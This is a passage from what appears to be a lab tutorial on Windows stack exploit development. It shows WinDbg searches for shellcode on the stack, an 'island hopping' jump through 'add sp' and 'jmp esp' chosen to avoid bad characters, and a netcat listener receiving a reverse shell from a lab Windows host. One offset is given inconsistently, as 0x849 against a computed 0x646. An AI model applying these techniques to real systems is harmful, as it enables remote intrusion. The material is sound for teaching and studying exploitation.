0091ff42 41              inc     ecx
0091ff43 41              inc     ecx
0091ff44 90              nop
0091ff45 90              nop
0091ff46 eb06            jmp     0091ff4e
0091ff48 f0a215103930    lock mov byte ptr ds:[30391015h],al
0091ff4e 3930            cmp     dword ptr [eax],esi  ds:0023:77ef6252=00258b64
0091ff50 3930            cmp     dword ptr [eax],esi
0091ff52 3930            cmp     dword ptr [eax],esi
0091ff54 3930            cmp     dword ptr [eax],esi
0091ff56 3930            cmp     dword ptr [eax],esi
0091ff58 3930            cmp     dword ptr [eax],esi
0091ff5a 3930            cmp     dword ptr [eax],esi
0091ff5c 3930            cmp     dword ptr [eax],esi
0091ff5e 3930            cmp     dword ptr [eax],esi
0091ff60 3930            cmp     dword ptr [eax],esi
0091ff62 3930            cmp     dword ptr [eax],esi
0091ff64 3930            cmp     dword ptr [eax],esi
0091ff66 3930            cmp     dword ptr [eax],esi
0091ff68 3930            cmp     dword ptr [eax],esi
```

But we know how to jump to it!
Now, let's search our shellcode.
**The TEB has two fields that indicate us the top and the bottom of the stack. These are the StackBase and StackLimit:**
```c
0:007> !teb
TEB at 00387000
    ExceptionList:        0091f454
    StackBase:            01900000
    StackLimit:           018fe000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00387000
    EnvironmentPointer:   00000000
    ClientId:             00000900 . 00001dec
    RpcHandle:            00000000
    Tls Storage:          00639cf0
    PEB Address:          00376000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
```

So our shellcode must be in between both fields. Let's search for it in WinDbg with the following command:

```
s -b <StackLimit> <StackBase> <pattern>
```

```C
0:008> !teb
TEB at 002a7000
    ExceptionList:        0174f454
    StackBase:            01750000
    StackLimit:           0174e000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 002a7000
    EnvironmentPointer:   00000000
    ClientId:             00001d14 . 00001e68
    RpcHandle:            00000000
    Tls Storage:          004f96f0
    PEB Address:          0029c000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
    
0:008> s -b 0174e000 01750000 90 90 b8 c2
0174faa0  90 90 b8 c2 aa b1 eb da-d8 d9 74 24 f4 5b 31 c9  ..........t$.[1.
0174ff5c  90 90 b8 c2 aa b1 eb da-d8 d9 74 24 f4 5b 31 c9  ..........t$.[1.

```

There are two places where our shellcode is stored!
First place is just after the short jump:
```c
0174ff45 90              nop
0174ff46 eb06            jmp     0174ff4e
0174ff48 f0a215109090    lock mov byte ptr ds:[90901015h],al
0174ff4e 90              nop
0174ff4f 90              nop
0174ff50 90              nop
0174ff51 90              nop
0174ff52 90              nop
0174ff53 90              nop
0174ff54 90              nop
0174ff55 90              nop
0174ff56 90              nop
0174ff57 90              nop
0174ff58 90              nop
0174ff59 90              nop
0174ff5a 90              nop
0174ff5b 90              nop
0174ff5c 90              nop
0174ff5d 90              nop
0174ff5e b8c2aab1eb      mov     eax,0EBB1AAC2h // START OF OUR SHELLCODE
0174ff63 
```
The other place is at the end of the stack:
```c
0:008> dds 0174faa0 L60
0174faa0  c2b89090
0174faa4  daebb1aa
0174faa8  2474d9d8
0174faac  c9315bf4
0174fab0  eb8352b1
0174fab4  0e4331fc
0174fab8  53a48103
0174fabc  1151f91e
0174fac0  76a201e1 combase!mega__MIDL_TypeFormatString+0x1561
0174fac4  b693e46b
```
BUT ONE IMPORTANT THING! If we take a look at both places, we can see that the place near the short jump does not have all the shellcode but only a part. Indeed, if we perform a search **of the last bytes of the shellcode, we find that they are only present in 1 place:**
```c
0:008> s -b 0174e000 01750000 e4 ae 6f
0174fbfe  e4 ae 6f 31 bc 77 8a 8c-ef 3d 00 c0 29 00 00 00  ..o1.w...=..)...
```
So, we have to jump to the other place where the complete shellcode is stored.

Combined with the short jump, we are going to do a technique called "island hopping".
Island hopping consists in:
- We have an address which we want to jump.
- We calculate the OFFSET from the stack pointer to such address. 
- In order to reach our shellcode, the stack pointer will have to be added that offset.
- Point the stack pointer to our shellcode by adding such offset that we calculated!
- Perform a JMP ESP to jump to the stack pointer, which is pointing at our shellcode.

To calculate the offset, first we put EIP after the short jump. Then, we calculate the offset of our shellcode to the ESP:
```c
0:008> s -b 0080e000 00810000 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 b8 c2
0080fa92  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0080ff4e  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:008> s -b 0080e000 00810000 e4 ae 6f
0080fbfe  e4 ae 6f 31 bc 77 e7 e4-38 b3 00 e0 39 00 00 00  ..o1.w..8...9...
```

```c
0:008> ? 0080fa92 - esp
Evaluate expression: 1606 = 00000646
```

**Note: this offset MIGHT NOT BE CONSISTENT between application resets or devices. If the offset changes slightly each time we launch our exploit, we must put a bigger NOP sled prior to our shellcode! So always put NOPs if you have space!**

Now, we have to add 0x849 (always in hex) to ESP.
Let's forge the command:
```bash
msf-nasm_shell 
nasm > add esp, 0x646
00000000  81C446060000      add esp,0x646
nasm > add esp, 1606
00000000  81C446060000      add esp,0x646  
nasm > jmp esp
00000000  FFE4              jmp esp
```

Very big note!
With this jump, the stack won't be aligned. **The stack must be aligned in a multiple of 16 bytes.** 
What we are doing by adding 1606 bytes to ESP is **unalign it, as 1606 is not a multiple of 16.**
We will turn from an aligned stack to an unaligned one. 
Indeed, if we don't align the stack we won't land on our NOPs and shellcode. Look where we will land:
```c
0:008> dds 0179fa92
0179fa92  46c48166
0179fa96  90e4ff06
0179fa9a  90909090
0179fa9e  90909090
0179faa2  90909090
0179faa6  b8909090
0179faaa  ebb1aac2
0179faae  74d9d8da
0179fab2  315bf424
0179fab6  8352b1c9
```

To fix that, we will add 1616 bytes instead of 1606, which is a multiple of 16 bytes, to keep the stack aligned.
In compensation, we can add some NOPs if we think that the extra bytes are going to make us not landing on our shellcode.
```c
nasm > add esp, 1616                                                                    
00000000  81C450060000      add esp,0x650 
```

**Note: check that this instruction does not includes BADCHARS!** 
If it does, a good tip is to substitute the add esp instruction, which uses all the 32 bits of the register, to add sp, which only uses the 16 least significant bits. This would change the instruction and might not contain badchars!
Our add esp instruction contains badchars, as it has two "00"s at the end that are neccesary as we are leading with instructions on top of each other.
So, let's try add sp, and our value:
```c
nasm > add sp, 0x650                                                                    
00000000  6681C45006        add sp,0x650
```
After checking if this had badchars, it does not.
There are two "zeros" in a row but each zero is from a different byte (50 - 06). 
We can still jump to ESP and not SP as this will add the lower bytes into ESP.

Once we insert such payload, we can see that after the short jump we perform the island hopping:
```c
0170ff44 90              nop
0170ff45 90              nop
0170ff46 eb06            jmp     0170ff4e
0170ff48 f0a215109090    lock mov byte ptr ds:[90901015h],al
0170ff4e 6681c45006      add     sp,650h
0170ff53 ffe4            jmp     esp {0170fa9c}
0170ff55 90              nop
```

If we inspect ESP, we see that all our shellcode is there and we land exactly there:
```c
eax=77c36252 ebx=0170f540 ecx=1015a2f0 edx=77c36270 esi=00000000 edi=00000000
eip=0170ff4e esp=0170f44c ebp=0170f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0170ff4e 6681c45006      add     sp,650h
0:008> t
eax=77c36252 ebx=0170f540 ecx=1015a2f0 edx=77c36270 esi=00000000 edi=00000000
eip=0170ff53 esp=0170fa9c ebp=0170f460 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
0170ff53 ffe4            jmp     esp {0170fa9c}
0:008> dds 0170fa9c
0170fa9c  90909090
0170faa0  90909090
0170faa4  90909090
0170faa8  aac2b890
```

And if we put a reverse shell we obtain it:
```
sudo nc -lvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.122.211] from DESKTOP-78JQLBM [192.168.122.113] 49776
Microsoft Windows [Version 10.0.19045.5737]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```
